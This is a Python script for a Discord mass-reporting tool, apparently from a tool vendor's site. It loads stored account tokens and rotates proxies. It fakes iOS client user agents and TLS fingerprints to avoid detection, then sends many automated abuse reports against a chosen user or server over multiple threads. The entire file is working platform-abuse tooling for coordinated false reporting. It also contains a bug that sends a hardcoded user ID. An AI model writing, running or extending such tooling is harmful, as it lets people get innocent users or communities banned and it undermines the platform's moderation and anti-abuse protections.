import tls_client 
import random
import time
import toml
import ctypes
import threading
import json

from concurrent.futures import ThreadPoolExecutor, as_completed
from functools import wraps
from logmagix import Logger, Home
from pystyle import Colors, Write

with open('input/config.toml') as f:
    config = toml.load(f)

DEBUG = config['dev'].get('Debug', False)
log = Logger()

def debug(func_or_message, *args, **kwargs) -> callable:
    if callable(func_or_message):
        @wraps(func_or_message)
        def wrapper(*args, **kwargs):
            result = func_or_message(*args, **kwargs)
            if DEBUG:
                log.debug(f"{func_or_message.__name__} returned: {result}")
            return result
        return wrapper
    else:
        if DEBUG:
            log.debug(f"Debug: {func_or_message}")

def debug_response(response) -> None:
    debug(response.headers)
    debug(response.text)
    debug(response.status_code)

class Miscellaneous:
    @debug
    def get_proxies(self) -> dict:
        try:
            if config['dev'].get('Proxyless', False):
                return None
                
            with open('input/proxies.txt') as f:
                proxies = [line.strip() for line in f if line.strip()]
                if not proxies:
                    log.warning("No proxies available. Running in proxyless mode.")
                    return None
                
                proxy_choice = random.choice(proxies)
                proxy_dict = {
                    "http": f"http://{proxy_choice}",
                    "https": f"http://{proxy_choice}"
                }
                log.debug(f"Using proxy: {proxy_choice}")
                return proxy_dict
        except FileNotFoundError:
            log.failure("Proxy file not found. Running in proxyless mode.")
            return None
    
    def get_tokens(self) -> str:
        with open('input/tokens.txt') as f:
            tokens = [line.strip() for line in f if line.strip()]
            if not tokens:
                log.failure("No tokens found.")
            return random.choice(tokens)
    
    @debug 
    def randomize_user_agent(self) -> str:
        discord_versions = [
            "69548",
            "69547",
            "69546",
            "69545"
        ]
        
        darwin_versions = [
            "24.3.0",
            "24.2.0",
            "24.1.0",
            "23.3.0"
        ]
        
        cfnetwork_versions = [
            "3826.400.110",
            "3826.400.100",
            "3826.300.110"
        ]
        
        version = random.choice(discord_versions)
        darwin = random.choice(darwin_versions)
        cfnet = random.choice(cfnetwork_versions)
        
        return f'Discord/{version} CFNetwork/{cfnet} Darwin/{darwin}'
        
    class Title:
        def __init__(self) -> None:
            self.running = False

        def start_title_updates(self, total, start_time) -> None:
            self.running = True
            def updater():
                while self.running:
                    self.update_title(total, start_time)
                    time.sleep(0.5)
            threading.Thread(target=updater, daemon=True).start()

        def stop_title_updates(self) -> None:
            self.running = False

        def update_title(self, total, start_time) -> None:
            try:
                elapsed_time = round(time.time() - start_time, 2)
                title = f'discord.cyberious.xyz | Total: {total} | Time Elapsed: {elapsed_time}s'

                sanitized_title = ''.join(c if c.isprintable() else '?' for c in title)
                ctypes.windll.kernel32.SetConsoleTitleW(sanitized_title)
            except Exception as e:
                log.debug(f"Failed to update console title: {e}")

class ReportMenu:
    def __init__(self):
        with open('dev/user.json') as f:
            self.user_tree = json.load(f)
        with open('dev/servers.json') as f:
            self.server_tree = json.load(f)

    def display_options(self, node_dict):
        Write.Print("\n╔════════════[ Available Options ]════════════╗\n", Colors.red_to_blue, interval=0.000)
        for idx, (option, _) in enumerate(node_dict.items(), 1):
            Write.Print(f"     [{idx}] {option}\n", Colors.red_to_blue, interval=0.000)
        Write.Print("╚═════════════════════════════════════════════╝\n\n", Colors.red_to_blue, interval=0.000)
        return list(node_dict.values())

    def get_user_breadcrumbs(self):
        breadcrumbs = [48, 10]  # Start with root node and profile select
        
        current_node = self.user_tree['nodes']['8']['subkeys']
        options = self.display_options(current_node)
        
        choice = int(log.question("Enter your choice (number): ")) - 1
        if 0 <= choice < len(options):
            selected = options[choice]
            breadcrumbs.append(8)
            breadcrumbs.append(selected)
    
            next_node = self.user_tree['nodes'].get(str(selected))
            if isinstance(next_node, dict) and 'subkeys' in next_node:
                sub_options = self.display_options(next_node['subkeys'])
                sub_choice = int(log.question("Enter your choice (number): ")) - 1
                if 0 <= sub_choice < len(sub_options):
                    breadcrumbs.append(sub_options[sub_choice])
        
        return breadcrumbs

    def get_server_breadcrumbs(self):
        breadcrumbs = [0]  # Start with root node
        
        current_node = self.server_tree['nodes']['0']['subkeys']
        options = self.display_options(current_node)
        
        choice = int(log.question("Enter your choice (number): ")) - 1
        if 0 <= choice < len(options):
            selected = options[choice]
            breadcrumbs.append(selected)

            next_node = self.server_tree['nodes'].get(str(selected))
            if isinstance(next_node, dict) and 'subkeys' in next_node:
                sub_options = self.display_options(next_node['subkeys'])
                sub_choice = int(log.question("Enter your choice (number): ")) - 1
                if 0 <= sub_choice < len(sub_options):
                    breadcrumbs.append(sub_options[sub_choice])
        
        return breadcrumbs

class MassReporter:
    def __init__(self, proxy_dict: dict = None) -> None:
        self.session = tls_client.Session("mms_ios_3", random_tls_extension_order=True)
        self.session.headers = {
        'accept': '*/*',
        'accept-language': 'fr-HU,en-HU;q=0.9,ar-HU;q=0.8,ru-HU;q=0.7,zh-Hant-HU;q=0.6,tr-HU;q=0.5,el-HU;q=0.4,am-HU;q=0.3,hi-HU;q=0.2,es-HU;q=0.1,my-HU;q=0.1',
        'authorization': Miscellaneous().get_tokens(),
        'connection': 'keep-alive',
        'content-type': 'application/json',
        'host': 'discord.com',
        'user-agent': Miscellaneous().randomize_user_agent(),
        'x-debug-options': 'bugReporterEnabled',
        'x-discord-locale': 'en-US',
        'x-discord-timezone': 'Europe/Budapest',
        }
        self.session.proxies = proxy_dict

    @debug
    def report_user(self, user_id: str, breadcrumbs: list) -> str | None:
        json_data = {
            'version': '1.0',
            'variant': '2',
            'language': 'en',
            'breadcrumbs': breadcrumbs,
            'elements': {
                'user_profile_select': [
                    "photos",
                    "name",
                    "descriptors"
                ],
            },
            'user_id': 1235300854823653386,
            'name': 'user',
        }

        response = self.session.post('https://discord.com/api/v9/reporting/user', json=json_data)

        debug_response(response)

        if response.status_code == 200 and response.json().get("report_id"):
            return response.json().get("report_id")
        else:
            log.failure(f"Failed to report user {user_id}, {response.text}, {response.status_code}")
        
        return None
    
    @debug
    def report_server(self, guild_id: str, breadcrumbs: list) -> str | None:
        json_data = {
            'version': '1.0',
            'variant': '1',
            'language': 'en',
            'breadcrumbs': breadcrumbs,
            'elements': {},
            'guild_id': guild_id,
            'name': 'guild'}

        response = self.session.post('https://discord.com/api/v9/reporting/guild', json=json_data)

        debug_response(response)

        if response.status_code == 200 and response.json().get("report_id"):
            return response.json().get("report_id")
        else:
            log.failure(f"Failed to report user {guild_id}, {response.text}, {response.status_code}")
        
        return None

@debug
def report(target_id: str, report_type: str, breadcrumbs: list, proxies: dict = None) -> tuple[bool, str]:
    try:
        Reporter = MassReporter(proxies)
        report_start = time.time()
        
        if report_type.lower() == "user":
            report_id = Reporter.report_user(target_id, breadcrumbs)
        else:
            report_id = Reporter.report_server(target_id, breadcrumbs)

        if report_id:
            log.message(
                "Discord",
                f"Successfully reported {report_type} {target_id}. Report ID: {report_id}",
                report_start,
                time.time()
            )
            return True
            
        return False, "Failed to get report ID"
            
    except Exception as e:
        error_msg = str(e)
        if "rate limited" in error_msg.lower():
            retry_after = e.response.json().get("retry_after", 60)
            log.warning(f"Rate limited. Waiting {retry_after} seconds...")
            time.sleep(retry_after)
        return False

def main():
    try:
        Home("Discord Reporter", align="center", credits="https://discord.cyberious.xyz").display()
        
        Misc = Miscellaneous()
        title_updater = Misc.Title()
        successful_reports = 0
        failed_reports = 0
        start_time = time.time()

        Write.Print("""
[1] ━ Report User
[2] ━ Report Server

""", Colors.red_to_blue, interval=0.000)
        
        choice = log.question("Select option (1-2): ")
        
        report_type = "user" if choice == "1" else "server" if choice == "2" else None
        
        if not report_type:
            log.failure("Invalid choice")
            return
            
        target_id = config['report'].get(f'{report_type}_id', '')
        if not target_id:
            target_id = log.question(f"Enter {report_type} ID to report: ")
        

        menu = ReportMenu()
        breadcrumbs = menu.get_user_breadcrumbs() if report_type == "user" else menu.get_server_breadcrumbs()
            
        report_amount = int(log.question("Enter number of reports to send: "))
        if report_amount < 1:
            log.failure("Report amount must be positive")
            return
            
        max_threads = config['dev'].get('Threads', 1)
        max_threads = min(max_threads, report_amount)
        
        title_updater.start_title_updates(successful_reports, start_time)
        
        with ThreadPoolExecutor(max_workers=max_threads) as executor:
            futures = []
            for _ in range(report_amount):
                proxies = Misc.get_proxies()
                futures.append(
                    executor.submit(report, target_id, report_type, breadcrumbs, proxies)
                )
            
            for future in as_completed(futures):
                try:
                    success = future.result()
                    if success:
                        successful_reports += 1
                    else:
                        failed_reports += 1
                        
                except Exception as e:
                    failed_reports += 1
                    log.failure(f"Thread error: {e}")
                    
        title_updater.stop_title_updates()
        
        if successful_reports > 0:
            log.success(f"Successfully sent {successful_reports}/{report_amount} reports")
        if failed_reports > 0:
            log.warning(f"Failed to send {failed_reports}/{report_amount} reports")
        if successful_reports == 0:
            log.failure("No reports were sent successfully")

    except KeyboardInterrupt:
        log.info("Exiting...")

    except Exception as e:
        log.failure(f"Main execution failed: {e}")
    

if __name__ == "__main__":
    main()
